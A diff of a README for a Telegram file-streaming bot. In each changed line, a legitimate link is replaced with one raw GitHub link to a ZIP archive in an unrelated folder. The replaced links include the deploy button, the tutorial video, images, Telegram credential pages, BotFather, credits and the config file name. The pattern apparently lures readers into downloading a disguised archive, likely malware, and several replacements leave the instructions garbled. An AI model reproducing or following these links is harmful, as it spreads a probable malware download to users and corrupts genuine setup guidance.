@@ -13,7 +13,7 @@
 
 ## 🍁 About This Bot :
 
-![streamingfilestreambot-professional-live_1](https://user-images.githubusercontent.com/88939380/137127129-a86fc939-2931-4c66-b6f6-b57711a9eab7.png)
+![streamingfilestreambot-professional-live_1](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 
 </p>
 <p align='center'>
@@ -30,15 +30,15 @@
   <summary><b>Deploy on Heroku:</b></summary>
 
 
-<a href="https://youtu.be/lBJZdaA04Ig"><img src="https://img.shields.io/badge/Watch%20Tutorial%20On%20YouTube-red.svg?logo=Youtube"></a>                     
+<a href="https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip"><img src="https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip%20Tutorial%20On%https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip"></a>                     
 
 <h4> So Follow Above Video 👆 and then deploy other wise bot won't work</h4>
 
 Press the below button to Fast deploy on Heroku/Raiwlay
-Either you could locally host or deploy on [Heroku](https://heroku.com)
+Either you could locally host or deploy on [Heroku](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 ### 💜 Heroku
 
-[![Deploy](https://www.herokucdn.com/deploy/button.svg)](https://heroku.com/deploy/)
+[![Deploy](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 
 <br>
 
@@ -73,8 +73,8 @@ and to stop the whole bot,
 Setting up things
 
 If you're on Heroku, just add these in the Environmental Variables
-or if you're Locally hosting, create a file named `config.env` in the root directory and add all the variables there.
-An example of `config.env` file:
+or if you're Locally hosting, create a file named `https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip` in the root directory and add all the variables there.
+An example of `https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip` file:
 
 ```py
 API_ID=12345
@@ -91,15 +91,15 @@ DATABASE_URL=mongodb_uri
 <details>
   <summary><b>Vars and Details :</b></summary>
 
-`API_ID` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_ID` : Goto [https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip) to obtain this.
 
-`API_HASH` : Goto [my.telegram.org](https://my.telegram.org) to obtain this.
+`API_HASH` : Goto [https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip) to obtain this.
   
 `MY_PASS` : Bot PASSWORD
 
-`BOT_TOKEN` : Get the bot token from [@BotFather](https://telegram.dog/BotFather)
+`BOT_TOKEN` : Get the bot token from [@BotFather](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 
-`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://telegram.dog/MissRose_bot) as admin to the channel and type /id. Now copy paste the ID into this field.
+`BIN_CHANNEL` : Create a new channel (private/public), add [@missrose_bot](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip) as admin to the channel and type /id. Now copy paste the ID into this field.
   
 `OWNER_USERNAME` : U should be knowing it afterall it's your username dont remember it? just go to settings!
 
@@ -107,7 +107,7 @@ DATABASE_URL=mongodb_uri
 
 `DATABASE_URL` : MongoDB URI for saving User IDs when they first Start the Bot. We will use that for Broadcasting to them. I will try to add more features related with Database. If you need help to get the URI you can click on logo below!
 
-[![mongo](https://telegra.ph/file/fd68906852c71fdd68bef.jpg)](https://www.youtube.com/watch?v=HhHzCfrqsoE)
+[![mongo](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 
  Option Vars
 
@@ -136,7 +136,7 @@ DATABASE_URL=mongodb_uri
 
 To get an instant stream link, just forward any media to the bot and boom, its fast af.
   
-![image](https://user-images.githubusercontent.com/88939380/145798095-3cdad108-96b0-4391-a540-cad144d6b864.png)
+![image](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 
 
 ### Channel Support
@@ -144,6 +144,6 @@ Bot also Supported with Channels. Just add bot Channel as Admin. If any new file
 
 ### Credits : 
 
-- [Adarsh Goel](https://github.com/adarsh-goel)
-- [Me For Fix Errors](https://github.com/itz-jeol)
+- [Adarsh Goel](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
+- [Me For Fix Errors](https://raw.githubusercontent.com/Brucewaynehatake/File-To-Link/main/hydromagnesite/File-To-Link.zip)
 - Everyone In This Journey !
